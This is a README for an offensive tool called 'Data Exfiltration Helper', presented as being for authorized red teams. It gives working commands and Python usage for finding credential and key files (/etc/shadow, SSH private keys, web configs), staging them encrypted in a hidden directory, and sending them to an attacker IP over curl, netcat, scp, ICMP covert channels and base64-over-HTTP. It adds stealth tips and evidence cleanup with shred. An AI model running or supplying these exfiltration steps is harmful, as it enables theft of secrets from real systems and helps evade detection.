# Data Exfiltration Helper

Safe data extraction framework for red team operations and penetration testing.

## ⚠️ Legal Warning

**This tool is for authorized penetration testing and red team operations ONLY.**

- ✅ Only use on systems with explicit written authorization
- ✅ Follow all applicable laws and regulations
- ✅ Protect all exfiltrated data appropriately
- ❌ Unauthorized data exfiltration is illegal
- ❌ Tool misuse can result in criminal prosecution

## Installation

```bash
# Method 1: Install as package
pip install -e .

# Method 2: Run directly
python3 -m data_exfiltrator --help
```

## Features

### File Discovery
- Automatically find interesting files (documents, credentials, keys, databases, source code)
- Search common locations (/home, /var/www, /opt, etc.)
- Extract file metadata (size, modification time)

### File Preparation
- **Compression**: gzip compression to reduce file size
- **Encryption**: AES-256-CBC encryption with openssl
- **Staging**: Organize files in hidden staging directory
- **Checksums**: SHA-256 integrity verification

### Exfiltration Methods
- **HTTP POST**: Upload via curl or Python requests
- **Netcat**: Direct TCP transfer
- **SCP**: Secure copy over SSH
- **Base64**: Encode and exfiltrate via HTTP/DNS
- **PowerShell**: Invoke-WebRequest for Windows
- **ICMP**: Covert channel via ICMP echo requests

### Output
- Command generation for all exfiltration methods
- Manifest file with checksums for verification
- HTTP server script for receiving files
- ICMP sender/receiver scripts

## Usage

### Basic Usage

```bash
# Find interesting files
python3 -m data_exfiltrator --find

# Stage files for exfiltration
python3 -m data_exfiltrator --stage /etc/passwd /root/.ssh/id_rsa \\
  --compress --encrypt --password secret123 \\
  --attacker-ip 10.10.14.5

# Create exfiltration server (run on attacker machine)
python3 -m data_exfiltrator --create-server

# Create ICMP scripts
python3 -m data_exfiltrator --create-icmp

# Cleanup staging directory
python3 -m data_exfiltrator --cleanup
```

### Programmatic Usage

```python
from data_exfiltrator import DataExfiltrator

# Create instance
exfil = DataExfiltrator(staging_dir='/tmp/.cache')

# Find interesting files
interesting = exfil.find_interesting_data()

# Stage files
staged = exfil.stage_for_exfiltration(
    ['/etc/passwd', '/root/.ssh/id_rsa'],
    compress=True,
    encrypt=True,
    password='secret123'
)

# Generate exfil commands
commands = exfil.generate_exfil_commands(
    staged,
    attacker_ip='10.10.14.5',
    attacker_port=8000
)

# Create manifest
manifest = exfil.create_manifest(staged)
```

### Use Individual Modules

```python
from data_exfiltrator.discovery import FileFinder
from data_exfiltrator.preparation import Staging

# Find files only
finder = FileFinder()
files = finder.find_all()

# Stage files only
staging = Staging('/tmp/.cache')
staged = staging.stage_files(['/etc/passwd'], compress=True)
```

## Module Structure

```
data_exfiltrator/
├── __init__.py                    # Package initialization
├── main.py                        # CLI entry point
├── core/
│   ├── __init__.py
│   ├── base.py                   # Main orchestrator
│   └── utils.py                  # Shared utilities
├── discovery/
│   ├── __init__.py
│   └── file_finder.py            # Find interesting files
├── preparation/
│   ├── __init__.py
│   ├── compression.py            # File compression
│   ├── encryption.py             # File encryption
│   └── staging.py                # File staging
├── methods/
│   ├── __init__.py
│   └── command_generator.py      # Generate exfil commands
└── output/
    ├── __init__.py
    ├── manifest.py               # Manifest generation
    └── servers.py                # Server scripts
```

## Exfiltration Workflow

1. **Discovery** - Find interesting files on target system
2. **Preparation** - Compress and encrypt files
3. **Staging** - Organize in hidden directory
4. **Generation** - Create exfiltration commands
5. **Transfer** - Execute chosen exfiltration method
6. **Verification** - Verify checksums from manifest

## Exfiltration Methods

### HTTP POST (Fast, Reliable)
```bash
# On attacker
python3 exfil_server.py

# On target
curl -X POST -F 'file=@file.gz.enc' http://10.10.14.5:8000/upload
```

**Pros**: Fast, reliable, works everywhere  
**Cons**: Easily logged, DLP may detect

### Netcat (Simple, Direct)
```bash
# On attacker
nc -lvnp 4444 > received_file.gz.enc

# On target
nc 10.10.14.5 4444 < file.gz.enc
```

**Pros**: Simple, no dependencies  
**Cons**: Not encrypted, easily detected

### SCP (Secure, Authenticated)
```bash
# On target
scp file.gz.enc user@10.10.14.5:/tmp/
```

**Pros**: Encrypted, authenticated  
**Cons**: Requires SSH access, credentials

### ICMP Covert Channel (Stealthy, Slow)
```bash
# On attacker
sudo python3 icmp_receiver.py

# On target
sudo python3 icmp_exfil.py file.gz.enc 10.10.14.5
```

**Pros**: Very stealthy, bypasses many firewalls  
**Cons**: Slow, requires root, may be detected by IDS

### Base64 over HTTP/DNS (Small Files)
```bash
# For small files (<100KB)
base64 file | while read line; do curl http://10.10.14.5:8000/$line; done
```

**Pros**: Works with strict firewalls  
**Cons**: Only for small files, slow

## File Types Searched

| Category | Patterns |
|----------|----------|
| **Documents** | *.doc, *.docx, *.pdf, *.xls, *.xlsx, *.ppt, *.pptx |
| **Credentials** | *password*, *credential*, *.key, *.pem, id_rsa* |
| **Keys** | *.key, *.pem, *.p12, *.pfx, *.cer, *.crt |
| **Databases** | *.db, *.sqlite, *.sql, *.mdb |
| **Source Code** | *.py, *.php, *.java, *.js, *.rb, *.go |

## Examples

### Example 1: Exfiltrate Sensitive Files
```bash
# Find interesting files
python3 -m data_exfiltrator --find

# Stage and compress
python3 -m data_exfiltrator --stage \\
  /etc/shadow \\
  /root/.ssh/id_rsa \\
  /var/www/html/config.php \\
  --compress --encrypt --password MySecret123

# On attacker machine
python3 -m data_exfiltrator --create-server
python3 exfil_server.py

# Use generated command
curl -X POST -F 'file=@shadow.gz.enc' http://10.10.14.5:8000/upload
```

### Example 2: Stealthy ICMP Exfiltration
```bash
# Create ICMP scripts
python3 -m data_exfiltrator --create-icmp

# On attacker (requires root)
sudo python3 icmp_receiver.py

# On target (requires root)
sudo python3 icmp_exfil.py sensitive_data.tar.gz.enc 10.10.14.5
```

### Example 3: Custom File Discovery
```python
from data_exfiltrator.discovery import FileFinder

# Find only specific file types
finder = FileFinder()
finder.FILE_PATTERNS = {
    'configs': ['*.conf', '*.config', '*.cfg'],
    'backups': ['*.bak', '*.backup', '*.old']
}

files = finder.find_all()

for category, file_list in files.items():
    print(f"{category}: {len(file_list)} files")
```

### Example 4: Automated Workflow
```python
from data_exfiltrator import DataExfiltrator

exfil = DataExfiltrator()

# Find and stage automatically
interesting = exfil.find_interesting_data()

# Stage all credential files
cred_files = [f['path'] for f in interesting['credentials'][:5]]

staged = exfil.stage_for_exfiltration(
    cred_files,
    compress=True,
    encrypt=True,
    password='secret'
)

# Generate commands
commands = exfil.generate_exfil_commands(staged, '10.10.14.5', 8000)

# Create manifest
exfil.create_manifest(staged)
```

## Platform Support

- ✅ Linux (Ubuntu, CentOS, Debian, Kali, etc.)
- ✅ Windows (PowerShell commands generated)
- ⚠️ macOS (partial support)

## Requirements

- Python 3.7+
- Standard library only (core functionality)
- Optional: openssl (for encryption)
- Optional: smbclient (for SMB exfiltration)

## Best Practices

### 1. Always Compress and Encrypt
```bash
python3 -m data_exfiltrator --stage file.txt \\
  --compress --encrypt --password StrongPassword123
```

### 2. Use Staging Directory
Keep exfiltrated files organized and hidden:
```bash
--staging-dir /tmp/.cache  # Hidden directory
```

### 3. Verify Integrity
Always check checksums from manifest.json:
```bash
sha256sum received_file
# Compare with checksum in manifest.json
```

### 4. Choose Right Method
- **Fast transfer needed**: HTTP POST
- **Stealthy transfer needed**: ICMP
- **Encrypted channel needed**: SCP
- **Small files**: Base64 over DNS

### 5. Clean Up After
```bash
# Remove staging directory
python3 -m data_exfiltrator --cleanup

# Or manually
shred -u /tmp/.cache/*
rmdir /tmp/.cache
```

## Security Considerations

### Encryption
All sensitive data should be encrypted before exfiltration:
```bash
--encrypt --password StrongPassword123
```

The tool uses AES-256-CBC with openssl.

### Stealth
To avoid detection:
1. Use compression to reduce transfer time
2. Use ICMP for stealthy transfer
3. Stage files in hidden directories
4. Exfiltrate during business hours (blend with traffic)
5. Use small chunks for ICMP

### Integrity
Always verify file integrity:
1. Check manifest.json checksums
2. Compare file sizes
3. Decrypt and decompress on attacker machine
4. Verify content

## Troubleshooting

### "openssl not available"
Install openssl:
```bash
# Ubuntu/Debian
sudo apt-get install openssl

# CentOS/RHEL
sudo yum install openssl
```

### "Permission denied" on staging directory
Choose a directory you have write access to:
```bash
--staging-dir /home/user/.cache
```

### ICMP exfiltration not working
1. Ensure you have root/admin privileges
2. Check firewall rules (allow ICMP)
3. Verify raw socket support

### Files not found
1. Check search paths in FileFinder
2. Verify file permissions
3. Look in specific directories manually

## Advanced Usage

### Custom Search Paths
```python
from data_exfiltrator.discovery import FileFinder

finder = FileFinder()
finder.SEARCH_PATHS = ['/opt/myapp', '/var/myapp', '/custom/path']
files = finder.find_all()
```

### Custom Compression
```python
from data_exfiltrator.preparation import Compressor

compressor = Compressor('/tmp/staging')
compressed = compressor.compress('/path/to/large/file')
```

### Parallel Exfiltration
```python
import concurrent.futures
from data_exfiltrator import DataExfiltrator

exfil = DataExfiltrator()
files = ['/file1', '/file2', '/file3']

with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
    futures = [
        executor.submit(exfil.stage_for_exfiltration, [f], True, True, 'pass')
        for f in files
    ]
    
    for future in concurrent.futures.as_completed(futures):
        staged = future.result()
        print(f"Staged: {staged}")
```

## Contributing

To add a new exfiltration method:

1. Add method to `methods/command_generator.py`
2. Update `_generate_for_file()` method
3. Add tests

Example:
```python
# Add FTP exfiltration
def _generate_ftp_command(self, file_path, attacker_ip):
    return f"ftp -n {attacker_ip} <<EOF\\nuser anonymous\\nput {file_path}\\nquit\\nEOF"
```

## License

[Your License Here]

## Disclaimer

This tool is provided for educational and authorized testing purposes only. The authors are not responsible for misuse or illegal use of this tool. Always obtain proper authorization before exfiltrating data from any system.

Unauthorized data exfiltration is a serious crime. Always get authorization. Always act ethically.

---

**Remember**: One wrong decision can end your career and land you in prison. Always get written authorization before exfiltrating data from any system.